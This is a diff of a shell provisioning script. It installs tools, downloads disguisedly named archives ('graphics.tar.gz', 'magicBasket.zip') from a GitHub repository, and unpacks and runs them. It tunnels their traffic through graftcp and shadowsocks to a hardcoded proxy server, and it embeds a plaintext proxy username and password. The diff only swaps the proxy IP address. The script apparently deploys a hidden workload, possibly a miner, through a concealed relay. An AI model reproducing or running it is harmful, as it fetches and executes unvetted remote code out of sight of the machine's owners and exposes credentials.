@@ -1,5 +1,7 @@
 #!/bin/sh
+
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+
 dpkg-reconfigure --frontend noninteractive tzdata
 
 apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
@@ -9,11 +11,17 @@ wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.g
 tar -xvzf graphics.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 52.15.235.202:1080
-socks5_username = mikrotik999
-socks5_password = Elibawnos
+
+listen = :2233 
+
+loglevel = 1 
+
+socks5 = 3.15.39.186:1080 
+
+socks5_username = mikrotik999 
+
+socks5_password = Elibawnos 
+
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -40,7 +48,7 @@ chmod +x basket
 
 apt -y install shadowsocks-libev rng-tools
 rngd -r /dev/urandom
-ss-local -s 52.15.235.202 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305 -v &
+ss-local -s 3.15.39.186 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305 -v &
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBasket.zip
 unzip magicBasket.zip
